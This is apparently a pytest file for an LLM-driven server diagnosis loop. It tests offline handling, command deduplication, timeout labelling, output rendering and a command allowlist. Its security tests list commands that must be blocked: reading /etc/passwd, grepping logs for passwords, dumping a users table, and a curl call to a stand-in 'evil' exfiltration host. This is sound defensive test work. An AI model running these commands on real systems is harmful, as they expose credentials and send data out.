"""Tests for diagnosis_loop tool dispatch quality + offline handling.

Covers the fixes for: agent-offline degraded path, command dedup, timeout
result labeling in followup context, and emitter rendering of those states.
"""
from __future__ import annotations

import json
import time

import pytest

from services.analyst import diagnosis_loop as dl
from workers import remote_diagnosis_emitter as em


def _redis():
    from fakeredis.aioredis import FakeRedis

    return FakeRedis(decode_responses=True)


class _FakeResp:
    def __init__(self, content: str):
        self.message = type("M", (), {"content": content})()


class _FakeLLM:
    """Returns queued JSON strings, one per chat() call."""

    def __init__(self, responses: list[dict]):
        self._responses = [json.dumps(r) for r in responses]
        self.calls: list[list[dict]] = []

    async def chat(self, *, model, messages, format=None, options=None):
        self.calls.append(list(messages))
        idx = min(len(self.calls) - 1, len(self._responses) - 1)
        return _FakeResp(self._responses[idx])


async def _register_agent(redis, agent_id, age_s=0):
    await redis.set(
        f"{dl._REGISTRY_KEY_PREFIX}{agent_id}",
        json.dumps({"agent_id": agent_id, "last_seen": int(time.time()) - age_s}),
    )


# ── _agent_is_online ────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_agent_online_true_when_fresh():
    redis = _redis()
    await _register_agent(redis, "uat-proxysql", age_s=10)
    assert await dl._agent_is_online(redis, "uat-proxysql") is True


@pytest.mark.asyncio
async def test_agent_online_false_when_stale():
    redis = _redis()
    await _register_agent(redis, "uat-proxysql", age_s=dl._AGENT_ONLINE_MAX_AGE_S + 50)
    assert await dl._agent_is_online(redis, "uat-proxysql") is False


@pytest.mark.asyncio
async def test_agent_online_false_when_unregistered():
    redis = _redis()
    assert await dl._agent_is_online(redis, "zabbix-uat") is False


# ── offline degraded path: no enqueue, degraded flag, >= MIN_TURNS ───────────

@pytest.mark.asyncio
async def test_offline_agent_runs_facts_only_degraded():
    redis = _redis()  # no registry → offline
    # LLM keeps asking for commands; loop must NOT dispatch and must finalize.
    llm = _FakeLLM([
        {"reasoning": "r1", "hypothesis": "disk full", "commands_to_run":
            [{"command": "du", "args": ["-sh", "/var"], "purpose": "p"}],
         "diagnosis_complete": False, "confidence": 0.5},
        {"reasoning": "r2", "hypothesis": "disk full", "commands_to_run": [],
         "diagnosis_complete": True, "confidence": 0.7,
         "root_cause": "Disk /var full", "affected_components": ["/var"],
         "remediation_steps": ["clean logs"]},
    ])
    ev_doc = {"probe": "disk_usage", "lane": "SYS_HARD_FAIL",
              "alert_hint": "no space", "extracted_fact": {"disk_used_pct": 99}}

    session = await dl.run_diagnosis_loop(
        redis=redis, llm_client=llm, agent_id="zabbix-uat",
        ev_doc=ev_doc, trace_id="t-offline",
    )

    assert session["degraded"] is True
    assert "agent_offline" in session["degraded_reason"]
    assert session["total_turns"] >= dl._MIN_TURNS
    # No command should have reached the queue.
    assert await redis.llen(f"{dl._CMD_QUEUE_PREFIX}zabbix-uat") == 0
    for turn in session["turns"]:
        assert turn["command_results"] == []


# ── online dedup: same command not enqueued twice ────────────────────────────

@pytest.mark.asyncio
async def test_online_dedup_skips_repeated_command(monkeypatch):
    redis = _redis()
    await _register_agent(redis, "uat-proxysql", age_s=5)

    # Both turns request the IDENTICAL command; turn-2 must be deduped.
    llm = _FakeLLM([
        {"reasoning": "r1", "hypothesis": "h", "commands_to_run":
            [{"command": "df", "args": ["-h", "/var"], "purpose": "p"}],
         "diagnosis_complete": False, "confidence": 0.4},
        {"reasoning": "r2", "hypothesis": "h", "commands_to_run":
            [{"command": "df", "args": ["-h", "/var"], "purpose": "p"}],
         "diagnosis_complete": True, "confidence": 0.8,
         "root_cause": "rc", "remediation_steps": ["x"]},
    ])

    enqueued: list[dict] = []
    orig = dl._enqueue_commands

    async def _spy(redis_, agent_id, commands, trace_id):
        enqueued.append({"agent_id": agent_id, "commands": list(commands)})
        return await orig(redis_, agent_id, commands, trace_id)

    monkeypatch.setattr(dl, "_enqueue_commands", _spy)

    # Don't actually wait 90s for results — return instantly.
    async def _fast_results(redis_, cmd_ids, timeout_s=0):
        return [{"cmd_id": c, "rc": 0, "stdout": "ok", "blocked": False} for c in cmd_ids]

    monkeypatch.setattr(dl, "_wait_for_results", _fast_results)

    ev_doc = {"probe": "disk_usage", "lane": "SYS_HARD_FAIL", "alert_hint": "x",
              "extracted_fact": {}}
    await dl.run_diagnosis_loop(
        redis=redis, llm_client=llm, agent_id="uat-proxysql",
        ev_doc=ev_doc, trace_id="t-dedup",
    )

    # Turn 1 enqueues df; turn 2's identical df is filtered → only ONE enqueue.
    assert len(enqueued) == 1


# ── followup context surfaces timeout instead of bare rc=1 ───────────────────

def test_followup_context_labels_timeout():
    results = [{
        "cmd_id": "cmd-1", "purpose": "check /var", "status": "timeout",
        "stdout": "", "stderr": "TIMEOUT: agent did not poll", "rc": 124,
    }]
    text = dl._build_followup_context(results, next_turn=2)
    assert "agent_unreachable" in text
    assert "did NOT execute" in text


def test_followup_context_surfaces_stderr_on_real_failure():
    results = [{
        "cmd_id": "cmd-2", "purpose": "p", "stdout": "", "stderr": "du: cannot access",
        "rc": 1,
    }]
    text = dl._build_followup_context(results, next_turn=2)
    assert "du: cannot access" in text


# ── emitter rendering ────────────────────────────────────────────────────────

def test_emitter_renders_timeout_marker():
    session = {
        "trace_id": "t1", "agent_id": "zabbix-uat", "probe": "disk_usage",
        "lane": "SYS_HARD_FAIL", "alert_hint": "no space", "degraded": True,
        "final": {"root_cause": "rc", "confidence": 0.7, "affected_components": [],
                  "remediation_steps": ["x"]},
        "turns": [{"turn": 1, "hypothesis": "h", "command_results": [
            {"cmd_id": "c", "status": "timeout", "rc": 124, "stdout": "",
             "stderr": "TIMEOUT", "purpose": "check"}]}],
    }
    msg = em.render_diagnosis_session(session)
    assert "agent offline — lệnh chưa chạy" in msg
    assert "DEGRADED" in msg
    # never leak a misleading rc=124
    assert "rc=124" not in msg


def test_format_command_joins_name_and_args():
    cmd = {"command": "ls", "args": ["-lS", "/var/log"], "purpose": "p"}
    assert dl._format_command(cmd) == "ls -lS /var/log"


def test_emitter_shows_actual_command_run():
    """The card MUST surface the verbatim command, not only the free-text purpose."""
    session = {
        "trace_id": "t2", "agent_id": "loyalty-uat", "probe": "disk_usage",
        "lane": "SYS_HARD_FAIL", "alert_hint": "/var elevated",
        "final": {"root_cause": "rc", "confidence": 0.9, "affected_components": [],
                  "remediation_steps": ["sudo truncate -s 0 /var/log/x.log"]},
        "turns": [{"turn": 1, "hypothesis": "h", "command_results": [
            {"cmd_id": "c", "rc": 0, "command_str": "ls -lS /var/log",
             "purpose": "list largest files",
             "stdout": "total 6644\n-rw-r----- 1 root 4.2G hostd.log"}]}],
    }
    msg = em.render_diagnosis_session(session)
    # 1. what it did — the real command
    assert "ls -lS /var/log" in msg
    # 2. what it found — top offender visible
    assert "4.2G hostd.log" in msg
    # 3. command to run — concrete remediation
    assert "sudo truncate -s 0 /var/log/x.log" in msg


# ── security: INV_NO_DATA_EXFIL ──────────────────────────────────────────────

@pytest.mark.parametrize("cmd,args", [
    ("cat", ["/etc/passwd"]),
    ("grep", ["password", "/var/log/app.log"]),
    ("tail", ["-n", "100", "/var/log/payments.log"]),
    ("mysql", ["-e", "SELECT * FROM users"]),
    ("strings", ["/var/lib/secret.db"]),
    ("curl", ["http://evil/exfil"]),
])
def test_content_read_commands_blocked(cmd, args):
    from remote_agent.command_executor import _is_command_allowed
    allowed, reason = _is_command_allowed(cmd, args)
    assert not allowed
    assert "data_exfil_blocked" in reason or "find_dangerous" in reason


@pytest.mark.parametrize("cmd,args", [
    ("ls", ["-lS", "/var/log"]),
    ("du", ["-sh", "/var/log"]),
    ("df", ["-h", "/var"]),
    ("systemctl", ["status", "mysql"]),
    ("journalctl", ["--disk-usage"]),
    ("free", ["-h"]),
])
def test_metadata_commands_allowed(cmd, args):
    from remote_agent.command_executor import _is_command_allowed
    allowed, reason = _is_command_allowed(cmd, args)
    assert allowed, reason


def test_find_exec_blocked():
    from remote_agent.command_executor import _is_command_allowed
    allowed, reason = _is_command_allowed("find", ["/var/tmp", "-mtime", "+7", "-delete"])
    assert not allowed
    assert "find_dangerous_flag_blocked" in reason


# ── system-thinking: blast_radius rendered ───────────────────────────────────

def test_emitter_renders_blast_radius():
    session = {
        "trace_id": "t3", "agent_id": "uat-proxysql", "probe": "disk_usage",
        "lane": "SYS_HARD_FAIL", "alert_hint": "disk",
        "final": {"root_cause": "rc", "confidence": 0.8, "affected_components": ["/var"],
                  "blast_radius": "proxysql + 2 downstream APIs lose query routing if /var fills",
                  "remediation_steps": ["x"]},
        "turns": [{"turn": 1, "hypothesis": "h", "command_results": []}],
    }
    msg = em.render_diagnosis_session(session)
    assert "Lan toả hệ thống" in msg
    assert "downstream APIs" in msg


def test_preview_shows_head_and_tail_regardless_of_sort():
    """ls -lrS (smallest first) still surfaces the biggest file (last line)."""
    stdout = "total 100\n" + "\n".join(f"-rw- {i}K file{i}.log" for i in range(1, 11)) + "\n-rw- 9999M huge.log"
    preview = em._preview_output(stdout)
    assert "huge.log" in preview  # tail preserved
    assert "total 100" in preview  # head preserved
    assert "dòng) …" in preview
